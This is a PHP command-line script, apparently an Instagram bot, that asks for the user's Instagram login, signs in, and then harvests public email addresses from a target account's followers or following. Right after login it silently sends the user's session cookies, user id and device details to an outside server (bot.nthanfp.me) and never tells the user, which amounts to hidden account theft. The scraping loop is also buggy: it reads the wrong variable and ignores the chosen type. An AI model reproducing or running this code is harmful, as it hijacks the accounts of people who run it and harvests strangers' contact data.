<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "[?] Input your instagram username : ";
$userig    = trim(fgets(STDIN, 1024));
echo "[?] Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "".$green."[+] Login Success....".$normal."\n";
    echo "".$green."[+] Please Wait".$normal."\n";
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig  = req('https://bot.nthanfp.me/action/api().php', $data);
    //start
    echo "[?] Input Target : ";
    $target = trim(fgets(STDIN, 1024));
    echo "[?] Input Type \n1) Followers\n2) Following\nJust Input Number : ";
    $tipex  = trim(fgets(STDIN, 1024));
    $jumlah = 10;
    echo "[?] Input Delay (in seconds) : ";
    $delay = trim(fgets(STDIN, 1024));
    $iyh   = true;
    do {
        echo "".$yellow."[!] Please Wait....".$normal."\n";
        if($tipex == 1):
            $tipenya = 'followers';
        else:
            $tipenya = 'following';
        endif;
        $idtarget   = getuid($target);
        $parameters = ($c>0) ? '?max_id='.$c : '';
        $dumpuser   = proccess(1, $useragent, 'friendships/'.$target.'/following/'.$parameters.'', $cookie);
    	$dumpuser   = json_decode($dumpuser[1], true);

    	for($i=0;$i<count($req['users']);$i++):
            $date         = date("Y-m-d H:i:s");
            $statususer   = proccess(1, $useragent, 'users/'.$req['users'][$i]['pk'].'/info', $cookie);
            $statususer   = json_decode($statususer[1], true);
            if($statususer['user']['public_email']){
            	echo "".$statususer['user']['public_email']." - ".$statususer['user']['username'];
            }
        endfor;

    	if($dumpuser['more_available'] == true){
    		 $next_id = $dumpuser['next_max_id'];
    		 $hasnext = true;
    		 echo "".$i.". Load more photos! Skipping... ".$next_id."\n";
    	} else {
    		$hasnext = false;
    	}
        
    } while($hasnext == true);
}
?>
